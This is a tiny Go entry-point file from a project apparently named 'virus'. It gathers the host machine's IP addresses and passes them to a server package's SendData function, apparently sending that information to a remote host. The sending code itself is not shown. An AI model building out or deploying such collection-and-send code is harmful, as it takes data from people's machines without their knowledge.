package main

import (
	"github.com/kolya59/virus/pkg/machine"
	"github.com/kolya59/virus/pkg/server"
)

func main() {
	m := machine.Machine{}
	m.GetIPS()
	server.SendData(m)
}
